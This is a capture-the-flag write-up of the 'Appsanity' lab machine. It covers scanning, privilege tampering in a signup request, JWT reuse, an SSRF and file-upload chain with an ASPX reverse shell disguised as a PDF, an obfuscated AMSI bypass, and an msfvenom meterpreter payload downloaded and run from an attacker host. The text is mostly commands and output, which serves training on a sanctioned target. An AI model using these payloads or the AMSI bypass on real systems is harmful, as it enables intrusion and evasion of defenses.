# Appsanity

## Reconnaissance

### Nmap

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -Pn 10.129.74.26
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:04 UTC
Nmap scan report for 10.129.74.26
Host is up (0.13s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT    STATE SERVICE VERSION
80/tcp  open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp open  https?
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 443/tcp)
HOP RTT       ADDRESS
1   66.39 ms  10.10.16.1
2   113.48 ms 10.129.74.26

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.23 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -A -T4 -sC -sV -Pn -p- 10.129.74.26
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:06 UTC
Nmap scan report for meddigi.htb (10.129.74.26)
Host is up (0.057s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Did not follow redirect to https://meddigi.htb/
443/tcp  open  https?
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7680/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   50.20 ms 10.10.16.1
2   63.78 ms meddigi.htb (10.129.74.26)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.89 seconds
```

```c
┌──(user㉿kali)-[~]
└─$ sudo nmap -sV -sU 10.129.74.26
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-28 19:09 UTC
Nmap scan report for meddigi.htb (10.129.74.26)
Host is up (0.051s latency).
All 1000 scanned ports on meddigi.htb (10.129.74.26) are in ignored states.
Not shown: 1000 open|filtered udp ports (no-response)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6801.65 seconds
```

### Enumeration of Port 443/TCP

> https://10.129.74.26/

We got redirected to `meddigi.htb` which we added to our `/etc/hosts` file.

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.74.26    meddigi.htb
```

```c
┌──(user㉿kali)-[~]
└─$ whatweb https://meddigi.htb/
https://meddigi.htb/ [200 OK] Bootstrap, Cookies[.AspNetCore.Mvc.CookieTempDataProvider], Country[RESERVED][ZZ], Email[support@meddigi.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], HttpOnly[.AspNetCore.Mvc.CookieTempDataProvider], IP[10.129.74.26], JQuery, Microsoft-IIS[10.0], Script, Strict-Transport-Security[max-age=2592000], Title[MedDigi]
```

> https://meddigi.htb/signin

> https://meddigi.htb/signup

We created a new account and logged in.

| Username | Email | Password |
| --- | --- | --- |
| foobar | foobar@foobar.local | foobar1! |

After logging in, we intercepted the requests with `Burp Suite`.

Request:

```c
POST /Profile/SendMessage HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8HD8b0pS44lJjn_dIzxs05Q4IdCiWOFQ33tVeollfhIRx9nQFwIHkUb2kautvI0CU6x0Z2mFo58JSFwU2qGq8agoj2JZtomNumq_Zgt6jiUsDhnUQ6azB55v-XxEGm9AZzp_7ClEgxNgGx7v9iv6bdo; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImZvb2JhckBmb29iYXIubG9jYWwiLCJuYmYiOjE2OTg1MjA1ODMsImV4cCI6MTY5ODUyNDE4MywiaWF0IjoxNjk4NTIwNTgzLCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.oJ4w1ej_GKQiqU5WkkkeuJA7xMymzYucGeik44Hn3BQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 247
Origin: https://meddigi.htb
Dnt: 1
Referer: https://meddigi.htb/Profile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers

messageContent=foobar&__RequestVerificationToken=CfDJ8HD8b0pS44lJjn_dIzxs05RyUERHpeX30zTi6HKWmPy1j44x1xQ6hNPlVAJRZIyunowwBw1RFHZBLi6sacIe1ANx2exMwviCRPW8UBY3HiPsl8FlANfT5s5jhQwourcdVBSkP8bjJJYhcq1QxajgarIfifOs3pW7-ysz47BwfUCIFuw21iPqxZTOuu6JmNIHeQ
```

> https://jwt.io/

HEADER:ALGORITHM & TOKEN TYPE

```c
{
  "alg": "HS256",
  "typ": "JWT"
}
```

PAYLOAD:DATA

```c
{
  "unique_name": "7",
  "email": "foobar@foobar.local",
  "nbf": 1698520583,
  "exp": 1698524183,
  "iat": 1698520583,
  "iss": "MedDigi",
  "aud": "MedDigiUser"
}
```

Response:

```c
HTTP/2 302 Found
Location: /Profile
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8HD8b0pS44lJjn_dIzxs05TSEMQFKDVeAnt78Z0h0p73VGrY3P-21lnyDu4GTKE1nUYR_h1rPU7yq0OVhnzxGba7RPcqXHYslKTPWS8dR50B3YrhtpgT3rBEFpMgdx1PvlrUui_YyRGBdArcsUnx_5A; path=/; samesite=lax; httponly
Date: Sat, 28 Oct 2023 19:21:33 GMT


```

Next we tried to send a message from the main page.

Request:

```c
POST /Home/Callback HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8HD8b0pS44lJjn_dIzxs05Q4IdCiWOFQ33tVeollfhIRx9nQFwIHkUb2kautvI0CU6x0Z2mFo58JSFwU2qGq8agoj2JZtomNumq_Zgt6jiUsDhnUQ6azB55v-XxEGm9AZzp_7ClEgxNgGx7v9iv6bdo; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImZvb2JhckBmb29iYXIubG9jYWwiLCJuYmYiOjE2OTg1MjA1ODMsImV4cCI6MTY5ODUyNDE4MywiaWF0IjoxNjk4NTIwNTgzLCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.oJ4w1ej_GKQiqU5WkkkeuJA7xMymzYucGeik44Hn3BQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 87
Origin: https://meddigi.htb
Dnt: 1
Referer: https://meddigi.htb/Home/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers

Name=foobar&Email=foobar%40foobar.local&Mobile=1234567890&Subject=foobar&Message=foobar
```

Response:

```c
HTTP/2 302 Found
Location: /#contact-section
Server: Microsoft-IIS/10.0
Strict-Transport-Security: max-age=2592000
Set-Cookie: .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8HD8b0pS44lJjn_dIzxs05RXiXP2DoK1PavmkHAai8dXKnUvIVm2kfS0c-8UNaYi8Ftze1Vqk4wwIfny8nia9KM2PcTiUIali-ZxcHvG8rXfidWuAbwEJTyYhs8muoFhCRahCASHgdX3n8w7g7lg5jDkVIBRxuzYwOoLw1YXgtey; path=/; samesite=lax; httponly
Date: Sat, 28 Oct 2023 19:26:23 GMT


```

```c
You currently have no supervising doctors.
```

There was also the chance to update the profile.

Request:

```c
POST /Profile/UpdateProfile HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8HD8b0pS44lJjn_dIzxs05Q4IdCiWOFQ33tVeollfhIRx9nQFwIHkUb2kautvI0CU6x0Z2mFo58JSFwU2qGq8agoj2JZtomNumq_Zgt6jiUsDhnUQ6azB55v-XxEGm9AZzp_7ClEgxNgGx7v9iv6bdo; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImZvb2JhckBmb29iYXIubG9jYWwiLCJuYmYiOjE2OTg1MjA1ODMsImV4cCI6MTY5ODUyNDE4MywiaWF0IjoxNjk4NTIwNTgzLCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.oJ4w1ej_GKQiqU5WkkkeuJA7xMymzYucGeik44Hn3BQ
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 331
Origin: https://meddigi.htb
Dnt: 1
Referer: https://meddigi.htb/Profile
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers

Name=Foobar&LastName=Foobar&Email=foobar%40foobar.local&PhoneNumber=1234567890&Password=&ConfirmPassword=&__RequestVerificationToken=CfDJ8HD8b0pS44lJjn_dIzxs05R0Mq7LcT8RKp1_0-2ttvv7Er_JytsIJ8ynY26G935HV-DGZO86qDTUwoc2JgdPTJhdiYfD5PQJyFFDp-vxS1ZLrmNcUndHHXAJf90GMR9W41Po6MsVl2H7O9-tHrWfyac2Sjl20utN80BQWpBw7NaJxh3k-xRa8yxjcVGV0ZnhZA
```

### Directory Busting with Gobuster

```c
┌──(user㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://meddigi.htb/  -k -b 302
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://meddigi.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   302
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/home                 (Status: 200) [Size: 32809]
/signup               (Status: 200) [Size: 7847]
/signin               (Status: 200) [Size: 3792]
/error                (Status: 200) [Size: 194]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

```c
┌──(user㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://meddigi.htb/home/  -k -b 302 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://meddigi.htb/home/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   302
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 32809]
/callback             (Status: 405) [Size: 1293]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

```c
┌──(user㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u https://portal.meddigi.htb/  -k -b 302
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://portal.meddigi.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   302
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login                (Status: 200) [Size: 2976]
/error                (Status: 200) [Size: 194]
Progress: 207643 / 207644 (100.00%)
===============================================================
Finished
===============================================================
```

### Subdomain Enumeration with ffuf

```c
┌──(user㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.meddigi.htb" -u https://meddigi.htb/ --fs 143

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://meddigi.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.meddigi.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 143
________________________________________________

portal                  [Status: 200, Size: 2976, Words: 1219, Lines: 57, Duration: 3478ms]
:: Progress: [114441/114441] :: Job [1/1] :: 181 req/sec :: Duration: [0:10:24] :: Errors: 0 ::
```

```c
┌──(user㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.74.26    meddigi.htb
10.129.74.26    portal.meddigi.htb
```

### Portal Enumeration

> https://portal.meddigi.htb/

```c
┌──(user㉿kali)-[~]
└─$ whatweb https://portal.meddigi.htb/
https://portal.meddigi.htb/ [200 OK] Bootstrap, Cookies[.AspNetCore.Mvc.CookieTempDataProvider], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], HttpOnly[.AspNetCore.Mvc.CookieTempDataProvider], IP[10.129.74.26], JQuery[3.7.1], Microsoft-IIS[10.0], Script, Strict-Transport-Security[max-age=2592000], Title[- MedDigi]
```

## Foothold

We had to register a new user and modify `Acctype=1` to `Acctype=2` while creating a new user.

Modified Request:

```c
POST /Signup/SignUp HTTP/2
Host: meddigi.htb
Cookie: .AspNetCore.Antiforgery.ML5pX7jOz00=CfDJ8DmhBHJdIKFNqVm-43etTuMjgfmEQWqLYZDU5Y_TYa1bQoSlEeF-dMDOJXlz_gxOibt4wwIL2d3NfSLLFQLBz4Bv8uYYRgX_-cP_9kNMiyDya6990LTQbIF7Ij3Kq9ShjS7s-Oc--6DclHKTtkskhvU; .AspNetCore.Mvc.CookieTempDataProvider=CfDJ8DmhBHJdIKFNqVm-43etTuMW6d-Gxyyhs_Jl3vmiHvs_Eflqu22KUuVuNnG46l4K_UjVP_MlkTwhMT3kNbqsc4vjsak81s0zJPcpXIHfOg3yGnIdoLYgI6FM1I-84_5-I-IR-aeo1iHRu21TkE-EWvYfnlSLQfKJFiimbahcOeE0xP7A65VLbhg4bSjE2KhBRA
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 356
Origin: https://meddigi.htb
Dnt: 1
Referer: https://meddigi.htb/signup
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-Gpc: 1
Te: trailers

Name=barfoo&LastName=barfoo&Email=barfoo%40barfoo.local&Password=barfoo1%21&ConfirmPassword=barfoo1%21&DateOfBirth=1980-01-01&PhoneNumber=1234567890&Country=Europe&Acctype=2&__RequestVerificationToken=CfDJ8DmhBHJdIKFNqVm-43etTuMWkoZiC3a1OA_X3gkVIm0ETmU5lG7_LEl4bc-_TxyPwORBQ6CHA8XdjO7R1SLbRjkd4k2QNO1LUUZ4P1P81RqQbIcMJFJdFk6do7tLcASgqfn2B0PvaX8jPea4uy14PQw
```

> https://meddigi.htb/Profile

After loggin in we could assign us a patient.

We grabbed the `access_token` with the following value, and created it on the subdomain https://portal.meddigi.htb.

access_token:

```c
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjciLCJlbWFpbCI6ImJhcmZvb0BiYXJmb28ubG9jYWwiLCJuYmYiOjE2OTg1Mjc0MzIsImV4cCI6MTY5ODUzMTAzMiwiaWF0IjoxNjk4NTI3NDMyLCJpc3MiOiJNZWREaWdpIiwiYXVkIjoiTWVkRGlnaVVzZXIifQ.KmhTUtpBwakutznI9A_OYzHEAT5_J1jbN1wRoMA7mxA
```

Refreshed the page and we were in.

> https://portal.meddigi.htb/Prescriptions

| Email address | Prescription Link |
| --- | --- |
| foobar@foobar.local | http://10.10.16.39/foobar |

```c
┌──(user㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.74.26 - - [28/Oct/2023 21:18:37] code 404, message File not found
10.129.74.26 - - [28/Oct/2023 21:18:37] "GET /foobar HTTP/1.1" 404 -
```

We called `http:127.0.0.1:8080` and found an internal `PDF` file with a link.

> https://portal.meddigi.htb/ViewReport.aspx?file=eefeccb8-4c86-45b4-a38d-81754324a11b_Cardiology_Report_1.pdf

### Reverse Shell

> https://github.com/borjmz/aspx-reverse-shell

```c
┌──(user㉿kali)-[/media/…/htb/machines/appsanity/files]
└─$ head -40 shell.aspx 
%PDF-1.5
%
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<script runat="server">
//Original shell post: https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
//Download link: https://www.darknet.org.uk/content/files/InsomniaShell.zip
    
        protected void Page_Load(object sender, EventArgs e)
    {
            String host = "10.10.16.39"; //CHANGE THIS
            int port = 9001; ////CHANGE THIS
                
        CallbackShell(host, port);
    }
<--- SNIP --->
```

> https://portal.meddigi.htb/examreport

We filled out the fields and uploaded the file. Then we went back to `https://portal.meddigi.htb/Prescriptions` and called `http://127.0.0.1:8080`.

```c
https://portal.meddigi.htb/ViewReport.aspx?file=23fa6e51-e946-40a1-b866-328b0a1715e9_shell.aspx
```

And with another call, we got our reverse shell.

```c
http://127.0.0.1:8080/ViewReport.aspx?file=23fa6e51-e946-40a1-b866-328b0a1715e9_shell.aspx
```

```c
┌──(user㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.39] from (UNKNOWN) [10.129.74.26] 49532
Spawn Shell...
Microsoft Windows [Version 10.0.19045.3570]
(c) Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>
```

## user.txt

```c
C:\Users\svc_exampanel\Desktop>type user.txt
type user.txt
43af0a7f297cefce0b08c63adba6b38d
```

## Enumeration

```c
PS C:\> whoami /all
whoami /all

USER INFORMATION
----------------

User Name               SID                                           
======================= ==============================================
appsanity\svc_exampanel S-1-5-21-4111732528-4035850170-1619654654-1007


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                            Attributes                                        
====================================== ================ ============================================================== ==================================================
Everyone                               Well-known group S-1-1-0                                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\BATCH                     Well-known group S-1-5-3                                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                      Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                      Alias            S-1-5-32-568                                                   Mandatory group, Enabled by default, Enabled group
LOCAL                                  Well-known group S-1-2-0                                                        Mandatory group, Enabled by default, Enabled group
IIS APPPOOL\ExamPanel                  Well-known group S-1-5-82-2916625395-3930688606-393764215-2099654449-2832396995 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                                                                      


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State   
============================= ==================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process   Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeAuditPrivilege              Generate security audits             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled 
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

## Persistence

There was `AMSI` running. So we bypassed it.

```c
C:\>powershell.exe
powershell.exe
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

Loading personal and system profiles took 560ms.
PS C:\>
```

```c
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

```c
PS C:\temp> S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
PS C:\temp>
```

```c
┌──(user㉿kali)-[/media/…/htb/machines/appsanity/serve]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp -ax64 -f exe LHOST=10.10.16.39 LPORT=443 > shell.exe    
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
```

```c
┌──(user㉿kali)-[~]
└─$ msfconsole
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.3.31-dev                          ]
+ -- --=[ 2346 exploits - 1220 auxiliary - 413 post       ]
+ -- --=[ 1390 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View all productivity tips with the 
tips command
Metasploit Documentation: https://docs.metasploit.com/

[*] Starting persistent handler(s)...
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.16.39:443
```

```c
PS C:\temp> iwr 10.10.16.39/shell.exe -o shell.exe
iwr 10.10.16.39/shell.exe -o shell.exe
```

```c
PS C:\temp> .\shell.exe
.\shell.exe
```

```c
[*] Sending stage (200774 bytes) to 10.129.74.26
[*] Meterpreter session 1 opened (10.10.16.39:443 -> 10.129.74.26:49535) at 2023-10-29 08:02:14 +0000

meterpreter >
```

## Further Enumeration

```c
PS C:\temp> systeminfo
systeminfo

Host Name:                 APPSANITY
OS Name:                   Microsoft Windows 10 Pro
OS Version:                10.0.19045 N/A Build 19045
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          remedy
Registered Organization:   
Product ID:                00330-80112-18556-AA118
Original Install Date:     9/15/2023, 6:52:34 AM
System Boot Time:          10/28/2023, 12:01:05 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2295 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.21100432.B64.2301110304, 1/11/2023
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     4,095 MB
Available Physical Memory: 2,801 MB
Virtual Memory: Max Size:  6,079 MB
Virtual Memory: Available: 4,749 MB
Virtual Memory: In Use:    1,330 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 3
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.74.26
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

```c
PS C:\Users> dir
dir


    Directory: C:\Users


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
